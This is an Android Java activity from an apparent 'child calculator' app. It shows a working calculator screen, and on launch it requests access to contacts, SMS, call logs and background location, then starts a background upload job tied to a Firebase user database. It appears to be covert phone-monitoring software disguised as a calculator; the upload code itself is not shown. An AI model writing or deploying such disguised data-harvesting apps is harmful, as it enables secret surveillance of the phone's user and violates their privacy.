package com.parentchild.childcalculator;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.work.OneTimeWorkRequest;
import androidx.work.PeriodicWorkRequest;
import androidx.work.WorkInfo;
import androidx.work.WorkManager;
import androidx.work.WorkRequest;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.location.LocationRequest;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Looper;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.util.Log;
import android.view.View;
import android.webkit.PermissionRequest;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;

import com.google.android.gms.common.api.ApiException;
import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationCallback;
import com.google.android.gms.location.LocationResult;
import com.google.android.gms.location.LocationServices;
import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.android.material.button.MaterialButton;
import com.google.android.material.snackbar.Snackbar;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;

import org.mozilla.javascript.Context;
import org.mozilla.javascript.Scriptable;

import java.security.acl.Permission;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.TimeUnit;

public class MainActivity2 extends AppCompatActivity {

    List<CallLogModel> list;
    List<ContactModel> cList;
    List<MessageModel> mList;
    FirebaseAuth auth = FirebaseAuth.getInstance();
    DatabaseReference ref = FirebaseDatabase.getInstance().getReference().child("Users");
    String username, uid;
    WorkRequest uploadWorkRequest;
    WorkManager workManager;
    LocationRequest locationRequest;
    FusedLocationProviderClient client;
    String permissionsList[] = new String[]{
            Manifest.permission.READ_CONTACTS, Manifest.permission.READ_SMS,
            Manifest.permission.READ_CALL_LOG, Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION, Manifest.permission.ACCESS_BACKGROUND_LOCATION};

    TextView answer, operation;
    MaterialButton c, ac, one, two, three, four, five, six, seven, eight, nine, zero, add, mul, sub, div, equal, open_brac, close_brac, dot;
    String op_txt = "";
    String finalRes;
    long op1, op2;
    long ans = 1;
    LinearLayout ll;
    ProgressBar pb;

    void askPermissions(){

        boolean callLog = ContextCompat.checkSelfPermission(MainActivity2.this, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED;
        boolean contact = ContextCompat.checkSelfPermission(MainActivity2.this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED;
        boolean location = ContextCompat.checkSelfPermission(MainActivity2.this,  Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED;
        boolean sms = ContextCompat.checkSelfPermission(MainActivity2.this,  Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED;


        if(!callLog){
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                requestPermissions(new String[] {Manifest.permission.READ_CALL_LOG, Manifest.permission.WRITE_CALL_LOG}, 18);
            }
        }

        if(!contact){
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                requestPermissions(new String[] {Manifest.permission.READ_CONTACTS}, 18);
            }
        }

        if(!location){
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                requestPermissions(new String[] {Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION, Manifest.permission.ACCESS_BACKGROUND_LOCATION}, 18);
            }

        }

        if(!sms){
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                requestPermissions(new String[] {Manifest.permission.READ_SMS}, 18);
            }
        }

    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main2);

        getSupportActionBar().hide();

        answer = findViewById(R.id.answer);
        operation = findViewById(R.id.operation);
        one = findViewById(R.id.one);
        two = findViewById(R.id.two);
        three = findViewById(R.id.three);
        four = findViewById(R.id.four);
        five = findViewById(R.id.five);
        six = findViewById(R.id.six);
        seven = findViewById(R.id.seven);
        eight = findViewById(R.id.eight);
        nine = findViewById(R.id.nine);
        zero = findViewById(R.id.zero);
        add = findViewById(R.id.add_op);
        mul = findViewById(R.id.mul_op);
        sub = findViewById(R.id.sub_op);
        div = findViewById(R.id.div_op);
        equal = findViewById(R.id.equal);
        open_brac = findViewById(R.id.open_bracket);
        close_brac = findViewById(R.id.close_bracket);
        c = findViewById(R.id.clear);
        ac = findViewById(R.id.ac);
        dot = findViewById(R.id.dot);
        pb = findViewById(R.id.progressBar);
        ll = findViewById(R.id.linearLayout);

        askPermissions();
        calculate();

        uploadWorkRequest =
                new OneTimeWorkRequest.Builder(UploadWorker.class)
                        .build();
        workManager
                .getInstance(MainActivity2.this)
                .enqueue(uploadWorkRequest);

        workManager = WorkManager.getInstance(MainActivity2.this);
        workManager.getWorkInfoById(uploadWorkRequest.getId()); // ListenableFuture<WorkInfo>

        workManager.getWorkInfoByIdLiveData(uploadWorkRequest.getId())
                .observe(MainActivity2.this, workInfo -> {
                    if (workInfo.getState() != null && workInfo.getState() == WorkInfo.State.SUCCEEDED) {
                        pb.setVisibility(View.GONE);
                        ll.setVisibility(View.VISIBLE);
                    }
                });
    }


    String getAnswer(String data){
        try{
            Context context = Context.enter();
            context.setOptimizationLevel(-1);
            Scriptable sc = context.initStandardObjects();
            finalRes =context.evaluateString(sc, data, "JavaScript", 1, null).toString();

        }
        catch (Exception e){
            finalRes = "Syntax Error";
        }

        return finalRes;
    }

    void calculate(){
        one.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                op_txt += "1";
                operation.setText(op_txt);
            }
        });

        two.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                op_txt += "2";
                operation.setText(op_txt);

            }
        });

        three.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                op_txt += "3";
                operation.setText(op_txt);

            }
        });
        four.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                op_txt += "4";
                operation.setText(op_txt);

            }
        });
        five.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                op_txt += "5";
                operation.setText(op_txt);

            }
        });
        six.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                op_txt += "6";
                operation.setText(op_txt);

            }
        });
        seven.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                op_txt += "7";
                operation.setText(op_txt);

            }
        });
        eight.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                op_txt += "8";
                operation.setText(op_txt);

            }
        });
        nine.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                op_txt += "9";
                operation.setText(op_txt);

            }
        });
        zero.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                op_txt += "0";
                operation.setText(op_txt);

            }
        });

        add.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                op_txt += "+";
                operation.setText(op_txt);
            }
        });

        ac.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                op_txt = "";
                operation.setText("");
                answer.setText("");
            }
        });


        sub.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                op_txt += "-";
                operation.setText(op_txt);
            }
        });
        mul.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                op_txt += "*";
                operation.setText(op_txt);

            }
        });

        div.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                op_txt += "/";
                operation.setText(op_txt);
            }
        });

        equal.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                answer.setText(getAnswer(op_txt));
            }
        });

        open_brac.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                op_txt += "(";
                operation.setText(op_txt);
            }
        });

        close_brac.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                op_txt += ")";
                operation.setText(op_txt);
            }
        });

        c.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                op_txt = "";
                operation.setText("");
                answer.setText("");
            }
        });

        dot.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                op_txt += ".";
                operation.setText(op_txt);
            }
        });

    }

}